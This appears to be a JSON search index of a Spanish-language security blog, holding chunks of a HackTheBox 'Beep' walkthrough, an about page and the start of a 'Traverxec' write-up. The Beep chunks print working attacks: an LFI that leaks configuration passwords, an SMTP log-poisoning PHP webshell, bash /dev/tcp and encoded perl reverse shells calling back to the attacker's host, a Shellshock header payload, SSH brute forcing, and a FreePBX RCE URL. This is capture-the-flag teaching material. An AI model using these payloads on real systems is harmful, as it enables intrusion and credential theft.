[{"categories":["HackTheBox Nix"],"content":"This is my description.","date":"2021-12-23","objectID":"/es/htb_beep/","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Set up Primero creo un directorio de trabajo: ❯ mkdir Beep ❯ cd !$ cd Beep Luego uso la función mk que he definido en mi archivo de configuración de zsh, que uso para crear mis directorios de trabajo: ❯ which mk mk () { mkdir {scans,content,loot,exploits,scripts,report} } ❯ mk ❯ ls  content  exploits  loot  report  scans  scripts Recon ","date":"2021-12-23","objectID":"/es/htb_beep/:0:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"OS Fingerprinting Esta es la función que he definido en el archivo de configuración de zsh .zshrc para identificar el sistema operativo basado en el valor TTL: ❯ which os os () { ttl=\"$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' ' -f 1 | tr -d '\\n')\" if (( $ttl \u003c= 64 )) then echo 'OS: Unix/Linux' elif (( $ttl \u003c= 128 )) then echo 'OS: Windows' else echo 'OS: Not detected' fi } Podemos identificar el sistema operativo ejecutando el siguiente comando: ❯ os 10.10.10.7 OS: Unix/Linux ","date":"2021-12-23","objectID":"/es/htb_beep/:1:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"TCP SYN Scan Entonces podemos intentar ejecutar un TCP SYN scan, no confundirlo con un TCP connect scan, nmap utiliza un TCP SYN Scan -sS por defecto, por lo que no es necesario especificarlo. Puedes leer la página de manual aquí: nmap ❯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.7 [sudo] password for kali: Sorry, try again. [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 15:48 EST Nmap scan report for 10.10.10.7 Host is up (0.25s latency). Not shown: 65519 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap 443/tcp open https 878/tcp open unknown 993/tcp open imaps 995/tcp open pop3s 3306/tcp open mysql 4190/tcp open sieve 4445/tcp open upnotifyp 4559/tcp open hylafax 5038/tcp open unknown 10000/tcp open snet-sensor-mgmt Nmap done: 1 IP address (1 host up) scanned in 11.31 seconds ","date":"2021-12-23","objectID":"/es/htb_beep/:2:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Service Fingerprinting Esta es otra función que tengo en mi zsh para extraer puertos TCP: ❯ which xp xp () { ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\" echo \"[+] Open ports: $ports\" \u003e\u003e xp.tmp printf $ports | xclip -sel clip echo \"[+] Ports copied to clipboard\" \u003e\u003e xp.tmp /usr/bin/bat xp.tmp rm xp.tmp } Luego extraigo los puertos TCP: ❯ xp scans/nmap-tcpall ───────┬─────────────────────────────────────────────────────────────────────────────── │ File: xp.tmp ───────┼─────────────────────────────────────────────────────────────────────────────── 1 │ [+] Open ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038, │ 10000 2 │ [+] Ports copied to clipboard ───────┴─────────────────────────────────────────────────────────────────────────────── Nmap tiene algunos scripts que podemos utilizar para recopilar información sobre los servicios: find / -name '*.nse' -type f 2\u003e/dev/null Ahora me gusta enumerar los servicios usando los de scripts nmap y ver el tiempo de ejecución con -vvv: sudo nmap -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 -n -Pn --min-rate 5000 -sCV -oN scans/nmap-tcpscripts 10.10.10.7 -vvv Una vez que termina, podemos leer el archivo de nmap: cat scans/nmap-tcpscripts.nmap Web - TCP 80 -\u003e TCP 443 ","date":"2021-12-23","objectID":"/es/htb_beep/:3:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Response Headers Enumeration Cuando enumeramos las cabeceras (headers) de respuesta podemos ver un 302 encontrado: ❯ curl -I http://10.10.10.7 HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 22:44:21 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Connection: close Content-Type: text/html; charset=iso-8859-1 Sigamos la redirección con -L: ❯ curl -I http://10.10.10.7 -L HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 22:44:29 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Connection: close Content-Type: text/html; charset=iso-8859-1 curl: (60) SSL certificate problem: self signed certificate More details here: https://curl.se/docs/sslcerts.html curl failed to verify the legitimacy of the server and therefore could not establish a secure connection to it. To learn more about this situation and how to fix it, please visit the web page mentioned above. Podemos ver un problema dell certificado SSL, así que vamos a ignorarlo con -k: ❯ curl -Ik http://10.10.10.7 -L HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 22:46:05 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Connection: close Content-Type: text/html; charset=iso-8859-1 HTTP/1.1 200 OK Date: Wed, 22 Dec 2021 22:46:06 GMT Server: Apache/2.2.3 (CentOS) X-Powered-By: PHP/5.1.6 Set-Cookie: elastixSession=7mh9441083miqlnc9f5t7iff25; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Connection: close Content-Type: text/html; charset=UTF-8 Alternativamente, podemos hacer esto de una sola vez con whatweb: ❯ whatweb -a 3 -v 10.10.10.7 WhatWeb report for http://10.10.10.7 Status : 302 Found Title : 302 Found IP : 10.10.10.7 Country : RESERVED, ZZ Summary : HTTPServer[CentOS][Apache/2.2.3 (CentOS)], Apache[2.2.3], RedirectLocation[https://10.10.10.7/] Detected Plugins: [ Apache ] The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows NT. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services in sync with the current HTTP standards. Version : 2.2.3 (from HTTP Server Header) Google Dorks: (3) Website : http://httpd.apache.org/ [ HTTPServer ] HTTP server header string. This plugin also attempts to identify the operating system from the server header. OS : CentOS String : Apache/2.2.3 (CentOS) (from server string) [ RedirectLocation ] HTTP Server string location. used with http-status 301 and 302 String : https://10.10.10.7/ (from location) HTTP Headers: HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 23:02:27 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Content-Length: 278 Connection: close Content-Type: text/html; charset=iso-8859-1 WhatWeb report for https://10.10.10.7/ Status : 200 OK Title : Elastix - Login page IP : 10.10.10.7 Country : RESERVED, ZZ Summary : X-Powered-By[PHP/5.1.6], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], Script[text/javascript], Apache[2.2.3], PasswordField[input_pass], Cookies[elastixSession], PHP[5,5.1,5.1.6] Detected Plugins: [ Apache ] The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows NT. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services in sync with the current HTTP standards. Version : 2.2.3 (from HTTP Server Header) Google Dorks: (3) Website : http://httpd.apache.org/ [ Cookies ] Display the names of cookies in the HTTP headers. The values are not returned to save on space. String : elastixSession [ HTTPServer ] HTTP server header string. This plugin also attempts to identify the operating system from the server header. OS : CentOS String : Apache/2.2.3 (CentOS) (from server string) [ PHP ] PHP is a widely-used general-purpose scripting language that is especially suited for Web development and can be embedded into HTM","date":"2021-12-23","objectID":"/es/htb_beep/:4:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Directory \u0026 Files Fuzzing Las listas de palabras más comunes para el fuzzing son: common.txt big.txt directory-list.2.3-medium.txt Voy a eliminar las líneas que empiezan con un comentario de la lista de palabras directory-list.2.3-medium.txt y crear una nueva lista de palabras sin ellas: catn /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep -v '^#' \u003e directory-list-2.3-medium.txt Como sabemos que este sitio utiliza PHP podemos añadir una lista de extensiones: ❯ ffuf -w directory-list-2.3-medium.txt -u https://10.10.10.7/FUZZ -e .php,.txt -t 150 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u003c3 ________________________________________________ :: Method : GET :: URL : https://10.10.10.7/FUZZ :: Wordlist : FUZZ: directory-list-2.3-medium.txt :: Extensions : .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 150 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ images [Status: 301, Size: 310, Words: 20, Lines: 10] index.php [Status: 200, Size: 1785, Words: 103, Lines: 35] [Status: 200, Size: 1785, Words: 103, Lines: 35] help [Status: 301, Size: 308, Words: 20, Lines: 10] register.php [Status: 200, Size: 1785, Words: 103, Lines: 35] themes [Status: 301, Size: 310, Words: 20, Lines: 10] modules [Status: 301, Size: 311, Words: 20, Lines: 10] mail [Status: 301, Size: 308, Words: 20, Lines: 10] admin [Status: 301, Size: 309, Words: 20, Lines: 10] static [Status: 301, Size: 310, Words: 20, Lines: 10] lang [Status: 301, Size: 308, Words: 20, Lines: 10] config.php [Status: 200, Size: 1785, Words: 103, Lines: 35] robots.txt [Status: 200, Size: 28, Words: 3, Lines: 3] var [Status: 301, Size: 307, Words: 20, Lines: 10] panel [Status: 301, Size: 309, Words: 20, Lines: 10] [WARN] Caught keyboard interrupt (Ctrl-C) ","date":"2021-12-23","objectID":"/es/htb_beep/:5:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"/admin Al ir a /admin, pide un inicio de sesión con autenticación básica HTTP: Si intentamos admin:admin no entra, sin embargo, si le damos a cancelar nos redirige a /admin/config.php: ","date":"2021-12-23","objectID":"/es/htb_beep/:5:1","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"LFI Si usamos searchsploit para encontrar exploits en Elastix: ❯ searchsploit elastix ----------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------- --------------------------------- Elastix - 'page' Cross-Site Scripting | php/webapps/38078.py Elastix - Multiple Cross-Site Scripting Vulnerabilit | php/webapps/38544.txt Elastix 2.0.2 - Multiple Cross-Site Scripting Vulner | php/webapps/34942.txt Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl Elastix 2.x - Blind SQL Injection | php/webapps/36305.txt Elastix \u003c 2.5 - PHP Code Injection | php/webapps/38091.php FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Executi | php/webapps/18650.py ----------------------------------------------------- --------------------------------- Shellcodes: No Results Podemos ver una lista de exploits, para acotar esto podemos usar la pista de la máquina, que dice LFI, o podemos leer cada exploit y confirmar si la vulnerabilidad existe, en este caso si leemos el exploit el siguiente exploit de perl: ❯ searchsploit -x php/webapps/37637.pl Hay una línea que podemos usar para confirmar si este archivo existe: #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action Podemos usar curl para confirmar que este archivo existe: ❯ curl -Isk https://10.10.10.7/vtigercrm/graph.php HTTP/1.1 200 OK Date: Wed, 22 Dec 2021 23:12:58 GMT Server: Apache/2.2.3 (CentOS) X-Powered-By: PHP/5.1.6 Connection: close Content-Type: text/html; charset=UTF-8 Podemos confirmar el POC con curl: ❯ curl -vsk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action\" * Trying 10.10.10.7:443... * Connected to 10.10.10.7 (10.10.10.7) port 443 (#0) \u003c..SNIP..\u003e # AMPDBPASS=amp109 AMPDBPASS=jEhdIekWmdjE \u003c..SNIP..\u003e Debido a que no hay filtro de ‘../’ y puedo pasar el porcentaje %00 para truncar el texto, y la opción current_language lleva a un archivo, podemos hacer LFI. El porcentaje %00 indica que PHP está añadiendo la extensión .php a la entrada antes de incluirla. Al agregar el porcentaje %00 a una instancia de PHP obsoleta truncaría la cadena, haciendo que la extensión .php sea ignorado. Parece que tenemos algunas contraseñas de la salida anterior, podemos filtrar esto: ❯ curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action\" | grep -E 'PASS=|PASSWORD=' # AMPDBPASS=amp109 AMPDBPASS=jEhdIekWmdjE #AMPMGRPASS=amp111 AMPMGRPASS=jEhdIekWmdjE #FOPPASSWORD=passw0rd FOPPASSWORD=jEhdIekWmdjE ARI_ADMIN_PASSWORD=jEhdIekWmdjE Guárdalo en un archivo: curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action\" | grep -E 'PASS=|PASSWORD=' | cut -d '=' -f 2 | uniq -u \u003e\u003e passwords.txt Ahora tenemos una lista de contraseñas: amp109 amp111 jEhdIekWmdjE passw0rd Ya que tenemos LFI, podemos intentar enumerar los usuarios también, vamos a leer el archivo /etc/passwd: ❯ curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00\u0026module=Accounts\u0026action\" root❌0:0:root:/root:/bin/bash bin❌1:1:bin:/bin:/sbin/nologin daemon❌2:2:daemon:/sbin:/sbin/nologin adm❌3:4:adm:/var/adm:/sbin/nologin lp❌4:7:lp:/var/spool/lpd:/sbin/nologin sync❌5:0:sync:/sbin:/bin/sync shutdown❌6:0:shutdown:/sbin:/sbin/shutdown halt❌7:0:halt:/sbin:/sbin/halt mail❌8:12:mail:/var/spool/mail:/sbin/nologin news❌9:13:news:/etc/news: uucp❌10:14:uucp:/var/spool/uucp:/sbin/nologin operator❌11:0:operator:/root:/sbin/nologin games❌12💯games:/usr/games:/sbin/nologin gopher❌13:30:gopher:/var/gopher:/sbin/nologin ftp❌14:50:FTP User:/var/ftp:/sbin/nologin nobody❌99:99:Nobody:/:/sbin/nologin mysql❌27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache❌94:94:Distcache:/:/sbin/nologin vcsa❌69:69:virtual console memory","date":"2021-12-23","objectID":"/es/htb_beep/:6:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"SMTP User Enumeration Podemos validar que los usuarios que tienen un email en SMTP: ❯ telnet 10.10.10.7 25 Trying 10.10.10.7... Connected to 10.10.10.7. Escape character is '^]'. 220 beep.localdomain ESMTP Postfix HELO 501 Syntax: HELO hostname HELO wixnic 250 beep.localdomain VRFY root@localhost 252 2.0.0 root@localhost VRFY root 252 2.0.0 root ","date":"2021-12-23","objectID":"/es/htb_beep/:7:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"SMTP Log Poisoning through LFI to RCE [Path #1] Ya que el SMTP está abierto podemos intentar enviar correos electrónicos con código malicioso, este código malicioso se almacenará en los archivos de registro bajo /var/mail/[nombre de usuario], ya tenemos nombres de usuario válidos así que podemos intentar hacer Log Poisoning vía SMTP y acceder al registro vía LFI. Utilicemos telnet para enviar un correo electrónico: telnet 10.10.10.7 25 HELO wixnic MAIL FROM:\u003cwixnic@helo.htb\u003e RCPT TO:\u003casterisk@localhost\u003e DATA Message from telnet PHP code: \u003c?php system($_REQUEST[\"telnet_cmd\"]); ?\u003e . QUIT Así se ve la salida de cada entrada: ❯ telnet 10.10.10.7 25 Trying 10.10.10.7... Connected to 10.10.10.7. Escape character is '^]'. 220 beep.localdomain ESMTP Postfix HELO wixnic 250 beep.localdomain MAIL FROM:\u003cwixnic@helo.htb\u003e 250 2.1.0 Ok RCPT TO:\u003casterisk@localhost\u003e 250 2.1.5 Ok DATA 354 End data with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e Message from telnet PHP code: \u003c?php system($_REQUEST[\"telnet_cmd\"]); ?\u003e . 250 2.0.0 Ok: queued as 37235D92FD QUIT 221 2.0.0 Bye Connection closed by foreign host. Ahora envía la petición curl con el parámetro \u0026telnet_cmd con el argumento como comando id: curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00\u0026module=Accounts\u0026action\u0026telnet_cmd=id\" Podemos enviar un correo electrónico con los intercambios: ❯ swaks --to asterisk@localhost --from wixnic@helo.htb --header \"Subject: Shell\" --body 'PHP code: \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e' --server 10.10.10.7 === Trying 10.10.10.7:25... === Connected to 10.10.10.7. \u003c- 220 beep.localdomain ESMTP Postfix -\u003e EHLO kali \u003c- 250-beep.localdomain \u003c- 250-PIPELINING \u003c- 250-SIZE 10240000 \u003c- 250-VRFY \u003c- 250-ETRN \u003c- 250-ENHANCEDSTATUSCODES \u003c- 250-8BITMIME \u003c- 250 DSN -\u003e MAIL FROM:\u003cwixnic@helo.htb\u003e \u003c- 250 2.1.0 Ok -\u003e RCPT TO:\u003casterisk@localhost\u003e \u003c- 250 2.1.5 Ok -\u003e DATA \u003c- 354 End data with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e -\u003e Date: Wed, 22 Dec 2021 19:07:02 -0500 -\u003e To: asterisk@localhost -\u003e From: wixnic@helo.htb -\u003e Subject: Shell -\u003e Message-Id: \u003c20211222190702.277580@kali\u003e -\u003e X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/ -\u003e -\u003e PHP code: \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e -\u003e -\u003e -\u003e . \u003c- 250 2.0.0 Ok: queued as D7063D92FD -\u003e QUIT \u003c- 221 2.0.0 Bye === Connection closed with remote host. Ahora podemos leer ese archivo con la LFI en y añadir \u0026cmd=id al final de la URL, para ejecutar comandos del sistema: curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00\u0026module=Accounts\u0026action\u0026cmd=id\" En lugar de id, vamos añadir una shell inversa, también voy a codificar los datos, en este caso el código de la shell inversa con --data-urlencode: ❯ curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00\u0026module=Accounts\u0026action\" --data-urlencode \"cmd=bash -i \u003e\u0026 /dev/tcp/10.10.16.3/443 0\u003e\u00261\" Ahora recibimos una shell: ❯ sudo nc -lvnp 443 listening on [any] 443 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 59168 bash: no job control in this shell bash-3.2$ id uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) bash-3.2$ whoami asterisk SSH - TCP 22 [Path #2] Podemos intentar la fuerza bruta de SSH: ❯ crackmapexec ssh 10.10.10.7 -u htb/box/Beep/users.txt -p passwords.txt SSH 10.10.10.7 22 10.10.10.7 [*] SSH-2.0-OpenSSH_4.3 SSH 10.10.10.7 22 10.10.10.7 [-] root:amp109 Authentication failed. SSH 10.10.10.7 22 10.10.10.7 [+] root:jEhdIekWmdjE (Pwn3d!) También podemos utilizar la hidra: ❯ hydra -L htb/box/Beep/users.txt -P passwords.txt -s 22 ssh://10.10.10.7 -v -t 4 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 18:37:00 [DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (l:6/p:4), ~6 tries per task [DAT","date":"2021-12-23","objectID":"/es/htb_beep/:8:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Shellshock [Path #3] Cada vez que hay CGI o un Script en una aplicación web, es bueno intentar probar ShellShock. Para probarlo, abriré burpsuite y enviaré la petición de inicio de sesión a Repeater y reemplazaré la cabecera User-Agent con la cadena del exploit Shellshock () { :; };[cmd], comenzando con un sleep de 5 segundos: User-Agent: () { :; };sleep 5 Si recibimos una respuesta en 5 segundos entonces funciona y eso confirmará que es vulnerable a shellshock. Vamos a intentar hacer un ping a nosotros mismos. Configurar un oyente/listener en ICMP: sudo tcpdump -ni tun0 icmp Crea una única petición de ping con -c 1: User-Agent: () { :; };ping -c 1 10.10.16.3 Y recibimos una conexión: ❯ sudo tcpdump -ni tun0 icmp [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 18:56:11.688169 IP 10.10.10.7 \u003e 10.10.16.3: ICMP echo request, id 20511, seq 1, length 64 18:56:11.688182 IP 10.10.16.3 \u003e 10.10.10.7: ICMP echo reply, id 20511, seq 1, length 64 Establezcamos una shell inversa: User-Agent: () { :; };bash -i \u003e\u0026 /dev/tcp/10.10.16.3/443 0\u003e\u00261 Recibimos una conexión como root: ❯ sudo nc -lvnp 443 listening on [any] 443 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 59290 bash: no job control in this shell [root@beep webmin]# id uid=0(root) gid=0(root) [root@beep webmin]# whoami root ","date":"2021-12-23","objectID":"/es/htb_beep/:9:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Webmin Command [Path #4] Podemos acceder a webmin con las credenciales root:jEhdIekWmdjE. Esta interfaz está diseñada para administrar el sistema y tenemos acceso de root debido a las credenciales que encontramos antes, así que podemos crear una tarea como root: En un minuto (dependiendo del tiempo que les hayas dado), el script se ejecutará y obtendremos una shell inversa: ❯ nc -lvnp 443 listening on [any] 443 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.7] 43947 bash: no job control in this shell [root@beep /]# id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) [root@beep /]# whoami root FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution [Path #5] Como sabemos que FreePBX está funcionando en este servidor, podemos probar este POC: ❯ searchsploit elastix freepbx ----------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py ----------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Mirando el exploit podemos ver un payload: import urllib import ssl rhost=\"10.10.10.7\" # add the target IP lhost=\"10.10.16.3\" # add your IP lport=443 # change the port extension=\"1000\" # change the extension number with a valid number ssl._create_default_https_context = ssl._create_unverified_context # Reverse shell payload url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c\u0026callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A' urllib.urlopen(url) Tenemos que modificar lo siguiente: Cambiar la IP del Host Remoto por la IP de destino Cambiar la IP del Host Local por la nuestra. Cambiar el puerto de escucha (¡si quieres!) Cambiar el número de extensión por un número válido Podemos utilizar el script python de sipvicious svwar para encontrar números de extensiones válidos: sipvicious github Podemos instalar sipvicious leyendo su página de documentación: sipvicious installation doc git clone https://github.com/enablesecurity/sipvicious.git cd sipvicious sudo python3 setup.py install pip3 install . sipvicious_svcrack --help Ahora necesitamos una invitación y una serie de extensiones para encontrar una autenticación: ❯ sipvicious_svwar -m INVITE -e 100-999 10.10.10.7 2\u003e/dev/null +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ | 407 | weird | +-----------+----------------+ | 409 | weird | +-----------+----------------+ | 525 | weird | +-----------+----------------+ | 534 | weird | +-----------+----------------+ | 504 | weird | +-----------+----------------+ | 519 | weird | +-----------+----------------+ | 791 | weird | +-----------+----------------+ | 759 | weird | +-----------+----------------+ | 825 | weird | +-----------+----------------+ | 884 | weird | +-----------+----------------+ La extensión 233 parece ser válida. Podemos conseguir una cáscara inversa haciéndolo manualmente: curl -sk \"https://10.10.10.7/recordings/misc/callme_page.php?action=c\u0026callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.3%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efd","date":"2021-12-23","objectID":"/es/htb_beep/:10:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","lfi","rce","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/es/htb_beep/"},{"categories":null,"content":"whoami Mi nombre es Yadiel Reyes, voy por el alias de wixnic. Soy un apasionado auto motivado que le gusta crear contenido sobre temas relacionados con la Seguridad Informática. En este blog encontrarás el contenido que se detalla a continuación: CTFs Programación Post-Explotación Evasión de AV Ingeniería Inversa Desarrollo de Exploits Cracking Hackeo de Video Juegos Educación: Bachillerato en Tecnología de la Información, Redes y Seguridad (GPA 4.0) Certificaciones: CompTIA Linux+ CompTIA Network+ Certificaciones para las que me estoy preparando OSCP OSEP Recursos Públicos Estos son recursos propios que he hecho para el público: HackNotes Donativo Te gusta mi contenido? Pues una donación es muy apreciada (no es obligatorio) pero me ayuda y se agradece. ","date":"2021-12-08","objectID":"/es/about/:0:0","tags":null,"title":"Sobre Mí","uri":"/es/about/"},{"categories":null,"content":"Donar con criptomoneda Si quieres donar con cripto, tengo estas opciones: Monero: Ethereum: Bitcoin: Dogecoin: ","date":"2021-12-08","objectID":"/es/about/:1:0","tags":null,"title":"Sobre Mí","uri":"/es/about/"},{"categories":null,"content":"Donar con dinero en efectivo Si quieres donar con dinero en efectivo: PayPal: Cómprame un café: ","date":"2021-12-08","objectID":"/es/about/:2:0","tags":null,"title":"Sobre Mí","uri":"/es/about/"},{"categories":["HackTheBox Nix"],"content":"This is my description.","date":"2021-10-22","objectID":"/es/htb_traverxec/","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Setup Como siempre, necesitamos un espacio comodo para trabajar así que voy a crear mis directorios de trabajo con la función mk que tengo definida en mi Z shell: ❯ which mk mk () { mkdir {scans,content,loot,exploits,scripts,report} } ❯ mk ❯ ls  content  exploits  loot  report  scans  scripts Recon ","date":"2021-10-22","objectID":"/es/htb_traverxec/:0:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Identificación de SO Vamos a empezar identificando el sistema operativo del objetivo con la función os de mi Z 